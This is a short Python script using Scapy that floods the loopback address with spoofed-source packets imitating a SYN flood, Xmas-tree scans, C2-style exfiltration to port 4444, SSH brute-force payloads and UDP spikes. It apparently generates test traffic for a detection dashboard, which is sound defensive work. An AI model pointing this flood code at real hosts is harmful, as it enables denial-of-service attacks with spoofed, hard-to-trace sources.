import random
import time
from scapy.all import IP, TCP, UDP, Raw, send, conf

conf.iface = "Loopback Pseudo-Interface 1"
TARGET = "127.0.0.1"

def start_multi_vector_chaos():
    for i in range(2000):
        fake_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
        
        # 1. Volumetric SYN Flood (DDoS)
        pkt_syn = IP(src=fake_ip, dst=TARGET)/TCP(sport=random.randint(1024, 65535), dport=80, flags="S")
        
        # 2. Xmas Tree Protocol Anomaly (Illegal Flags)
        pkt_xmas = IP(src=fake_ip, dst=TARGET)/TCP(sport=random.randint(1024, 65535), dport=random.randint(1, 1024), flags="FPU")
        
        # 3. High-Entropy Data Exfiltration (C2 Simulation)
        entropy_data = random.getrandbits(12000).to_bytes(1500, 'big')
        pkt_exfil = IP(src=fake_ip, dst=TARGET)/TCP(sport=random.randint(1024, 65535), dport=4444, flags="PA")/Raw(load=entropy_data)
        
        # 4. SSH Brute Force Simulation
        pkt_ssh = IP(src=fake_ip, dst=TARGET)/TCP(sport=random.randint(1024, 65535), dport=22)/Raw(load="admin:password123")
        
        # 5. DNS Amplification/UDP Spiking
        pkt_udp = IP(src=fake_ip, dst=TARGET)/UDP(sport=random.randint(1024, 65535), dport=53)/Raw(load="X"*1024)

        send(pkt_syn, verbose=False)
        send(pkt_xmas, verbose=False)
        send(pkt_exfil, verbose=False)
        send(pkt_ssh, verbose=False)
        send(pkt_udp, verbose=False)

        if i % 100 == 0:
            print(f"Status: {i*5} malicious flows injected. Check Dashboard.")

if __name__ == "__main__":
    start_multi_vector_chaos()